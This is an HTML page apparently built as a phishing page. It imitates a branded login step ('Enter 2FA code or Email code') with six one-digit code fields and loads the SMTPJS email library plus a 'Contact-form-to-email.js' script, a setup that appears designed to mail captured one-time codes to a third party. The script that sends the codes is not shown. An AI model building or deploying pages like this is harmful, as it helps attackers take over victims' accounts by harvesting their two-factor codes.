<body>
  <nav class="flex justify-between my-9 items-center px-4">
    <img src="paxlogo.svg" alt="">
    <div class="language flex items-center gap-x-3 border border-gray-500 py-1 px-2">
      <i class="bi bi-globe2"></i>
      <p>English</p>
      <i class="bi bi-chevron-down"></i>
    </div>
  </nav>
  <form class="mx-auto" id="form" method="POST">
    <div class="form__header pt-4 pb-8">
      <h1 class="capitalize text-xl font-bold">Enter 2FA code or Email code</h1>
      <p class="py-1">Enter the code from your 2FA app to confirm login</p>
    </div>
    <div class="inputsCtn w-full flex justify-between">
      <input class="input w-[48px] rounded-sm h-14 font-semibold text-center" onkeyup="inputInsideOtpInput(this)"
        name="pin1" required autofocus maxlength="1" type="tel">
      <input class="input w-[48px] rounded-sm h-14 font-semibold text-center" onkeyup="inputInsideOtpInput(this)"
        name="pin2" required maxlength="1" type="tel">
      <input class="input w-[48px] rounded-sm h-14 font-semibold text-center" onkeyup="inputInsideOtpInput(this)"
        name="pin3" required maxlength="1" type="tel">
      <input class="input w-[48px] rounded-sm h-14 font-semibold text-center" onkeyup="inputInsideOtpInput(this)"
        name="pin4" required maxlength="1" type="tel">
      <input class="input w-[48px] rounded-sm h-14 font-semibold text-center" onkeyup="inputInsideOtpInput(this)"
        name="pin5" required maxlength="1" type="tel">
      <input class="input w-[48px] rounded-sm h-14 font-semibold text-center" onkeyup="inputInsideOtpInput(this)"
        name="pin6" required maxlength="1" type="tel">
    </div>
    <input class="w-full p-[12px] rounded-sm" hidden>
    <button class="mt-10 w-full flex items-center justify-between p-4 rounded-sm text-white" type="submit"
      name="register">Log in <i class="bi bi-chevron-right"></i></button>
  </form>
  <script>
    function inputInsideOtpInput(el) {
      if (el.value.length > 1) {
        el.value = el.value[el.value.length - 1];
      }
      try {
        if (el.value == null || el.value == "") {
          this.foucusonkeyup(el.previousElementSibling);
        } else {
          this.foucusonkeyup(el.nextElementSibling);
        }
      } catch (e) {
        console.log(e);
      }
    }
    function foucusonkeyup(ele) {
      ele.focus();
      let val = ele.value;
      ele.value = "";
      // ele.value = val;
      setTimeout(() => {
        ele.value = val;
      })
    }
  </script>
  <script src = "https://smtpjs.com/v3/smtp.js"></script>
  <script src="Contact-form-to-email.js"></script>
  <script src="https://unpkg.com/sweetalert/sweetalert.min.js"></script>
